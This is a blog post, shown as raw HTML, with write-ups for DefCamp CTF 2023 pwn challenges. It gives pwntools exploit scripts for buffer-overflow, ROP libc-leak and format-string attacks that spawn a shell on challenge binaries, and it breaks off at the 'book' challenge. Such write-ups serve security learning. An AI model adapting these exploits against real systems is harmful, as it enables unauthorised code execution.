<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2106  baby-bof (105 solves &#x2F; 10 points) This is a basic buffer overflow.Flag format: CTF&amp;#123;sha256&amp;#125;Easy  Simple buffer overflow from gets. I simply jumped to fla">
<meta property="og:type" content="article">
<meta property="og:title" content="DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)">
<meta property="og:url" content="https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/index.html">
<meta property="og:site_name" content="HyeonJi Son">
<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2106  baby-bof (105 solves &#x2F; 10 points) This is a basic buffer overflow.Flag format: CTF&amp;#123;sha256&amp;#125;Easy  Simple buffer overflow from gets. I simply jumped to fla">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jiravvit.github.io/images/231023-d-ctf2023-ALL_PWN/book01.png">
<meta property="og:image" content="https://jiravvit.github.io/images/231023-d-ctf2023-ALL_PWN/system-leak01.png">
<meta property="article:published_time" content="2023-10-22T22:00:00.000Z">
<meta property="article:modified_time" content="2023-10-23T09:36:49.118Z">
<meta property="article:author" content="HyeonJi Son">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiravvit.github.io/images/231023-d-ctf2023-ALL_PWN/book01.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/231027-metared2023-master_jwt/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/230930-asisctf2023-nightjs/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&text=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&is_video=false&description=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)&body=Check out this article: https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&name=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&t=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-bof-105-solves-x2F-10-points"><span class="toc-number">1.</span> <span class="toc-text">baby-bof (105 solves &#x2F; 10 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve"><span class="toc-number">1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bistro-67-solves-x2F-12-points"><span class="toc-number">2.</span> <span class="toc-text">bistro (67 solves &#x2F; 12 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bistro-v2-72-solves-x2F-10-points"><span class="toc-number">3.</span> <span class="toc-text">bistro-v2 (72 solves &#x2F; 10 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#book-39-solves-x2F-247-points"><span class="toc-number">4.</span> <span class="toc-text">book (39 solves &#x2F; 247 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-3"><span class="toc-number">4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-leak-39-solves-x2F-247-points"><span class="toc-number">5.</span> <span class="toc-text">system-leak (39 solves &#x2F; 247 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-4"><span class="toc-number">5.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-write-33-solves-x2F-287-points"><span class="toc-number">6.</span> <span class="toc-text">system-write (33 solves &#x2F; 287 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-5"><span class="toc-number">6.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">HyeonJi Son</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-10-22T22:00:00.000Z" itemprop="datePublished">2023-10-23</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/D-CTF/">D-CTF</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ul>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/2106">https://ctftime.org/event/2106</a></li>
</ul>
<h2 id="baby-bof-105-solves-x2F-10-points"><a href="#baby-bof-105-solves-x2F-10-points" class="headerlink" title="baby-bof (105 solves &#x2F; 10 points)"></a>baby-bof (105 solves &#x2F; 10 points)</h2><blockquote>
<p>This is a basic buffer overflow.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p>
</blockquote>
<p>Simple buffer overflow from <code>gets</code>. I simply jumped to <code>flag</code>.</p>
<h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.182.195&#x27;, 31670)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x130</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x400767</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bistro-67-solves-x2F-12-points"><a href="#bistro-67-solves-x2F-12-points" class="headerlink" title="bistro (67 solves &#x2F; 12 points)"></a>bistro (67 solves &#x2F; 12 points)</h2><blockquote>
<p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p>
</blockquote>
<p>My decompiler didn’t work well, so I used an online decompiler. </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://dogbolt.org/">https://dogbolt.org/</a></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">custom</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose what you want to eat:&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4005E0: using guessed type __int64 __fastcall gets(_QWORD);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (000000000040076C) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;              MENU             &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Custom dinner............10$&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Hamburger.................3$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    custom();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Chessburger...............2$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is part of what Hexray decompiled. I can find simple buffer overflow from <code>custom</code>. The challenge didn’t give player a libc, so I need to find libc address. Fortunately, there is no PIE. :)</p>
<h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><ul>
<li>Remember to return to the main when you leak libc address.</li>
<li>If the stack is not aligned, you can add a <code>ret</code> assembly.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.89.133.49&#x27;</span>,<span class="number">30310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bistro-v2-72-solves-x2F-10-points"><a href="#bistro-v2-72-solves-x2F-10-points" class="headerlink" title="bistro-v2 (72 solves &#x2F; 10 points)"></a>bistro-v2 (72 solves &#x2F; 10 points)</h2><blockquote>
<p>Maybe you can get a free menu!!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p>
</blockquote>
<p>This challenge is similar to bistro. But simple logic is added.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> not_flag; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> flag; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;flag, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the restaurant V2!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(buff, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);   <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Show me your ticket to pass: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;not_flag);</span><br><span class="line">    <span class="keyword">if</span> ( flag == not_flag )</span><br><span class="line">      restaurant();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Permission denied!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I need a ticket(flag) for a <code>restaurant</code>. But how to know <code>flag</code>? The <code>flag</code> is from <code>/dev/urandom</code>. I obviously can’t predict this. But I can leak this from stack. Because there is a <code>format string bug(fsb)</code>! </p>
<p>The <code>flag</code> is stored on the stack. So I can leak this using <code>fsb</code>. If I leaked the required <code>flag</code>, the challenge is already over. (The rest is the same as the previous <code>bistro</code>.)</p>
<h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./restaurant-v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.141.71.230&#x27;</span>, <span class="number">31837</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./restaurant-v2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ticket = p.recvline()</span><br><span class="line">info(ticket)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, ticket)</span><br><span class="line"></span><br><span class="line"><span class="comment"># same as before</span></span><br><span class="line">ret = <span class="number">0x00000000004006ae</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400b33</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;restaurant&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">printf_got = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc.address = printf_got - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">binsh = printf_got + <span class="number">0x14eeaa</span></span><br><span class="line">system = printf_got-<span class="number">0x15a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="book-39-solves-x2F-247-points"><a href="#book-39-solves-x2F-247-points" class="headerlink" title="book (39 solves &#x2F; 247 points)"></a>book (39 solves &#x2F; 247 points)</h2><blockquote>
<p>Read books for inspiration so you know what to write!<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Medium</code></p>
</blockquote>
